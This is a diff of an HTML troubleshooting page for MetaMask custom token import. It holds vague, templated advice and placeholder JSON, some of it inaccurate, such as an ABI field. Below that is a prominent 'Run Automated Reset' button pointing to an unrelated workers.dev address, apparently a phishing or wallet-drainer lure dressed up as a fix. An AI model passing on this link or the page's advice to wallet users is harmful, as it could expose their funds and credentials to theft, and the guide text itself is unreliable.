@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Importing A Custom Token Does Not Work – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
+        font-family: BlinkMacSystemFont;
         background: #1a1a24;
         color: #ddd;
         padding: 20px;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #cf6679; }
     .btn {
-        background: #ff9455;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,34 +42,34 @@
 <h1>Metamask Extension Bug Importing A Custom Token Does Not Work</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users are unable to import custom tokens into their Metamask wallet extension, resulting in the token not being visible or accessible within the wallet.</li>
+<li>Users are unable to import custom tokens into their Metamask wallet, despite entering the correct token address and other required details. The import process seems to fail without providing any specific error messages, leaving users confused about the issue.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a potential mismatch between the token's contract address and the network ID, or an issue with the token's metadata, such as its symbol or decimal places.</li>
+<li>The error occurs due to a bug in the Metamask extension, which prevents it from correctly processing the import request for custom tokens. This could be due to outdated extension versions, incorrect token details, or issues with the Ethereum network connectivity.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Verify the token's contract address and network ID to ensure they match the expected values.</li>
-<li>Check the token's metadata, such as its symbol and decimal places, to ensure they are correctly formatted.</li>
-<li>Use the following JSON configuration to manually add the token:</li>
+<li>Try updating Metamask to the latest version to ensure you have the bug fixes.</li>
+<li>Manually add the token using the token's JSON ABI:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...token contract address...&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...token symbol...&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="err">...</span><span class="kc">t</span><span class="err">oke</span><span class="kc">n</span><span class="w"> </span><span class="err">decimal</span><span class="w"> </span><span class="err">places...</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;image&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...token image URL...&quot;</span>
+<span class="w">  </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...token address...&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;abi&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="err">...</span><span class="kc">t</span><span class="err">oke</span><span class="kc">n</span><span class="w"> </span><span class="err">abi...</span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...token name...&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="err">...</span><span class="kc">t</span><span class="err">oke</span><span class="kc">n</span><span class="w"> </span><span class="err">decimals...</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external interface, such as MyEtherWallet, for troubleshooting token import issues.</p>
-<h2>Prerequisites</h2>
 <ul>
-<li>Metamask wallet extension installed and configured.</li>
-<li>Token contract address and metadata available.</li>
-<li>Basic understanding of Ethereum blockchain and token standards.</li>
+<li>Clear browser cache and cookies to ensure a fresh start.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-account-discovery-and-syncs-error-for-so.html">Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li></ul>
+<p>Prerequisites:
+* Metamask extension installed
+* Ethereum mainnet or testnet selected
+* Correct token address and details available</p>
+<p>For advanced troubleshooting, consider using an external Ethereum console to verify token details and test connectivity.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
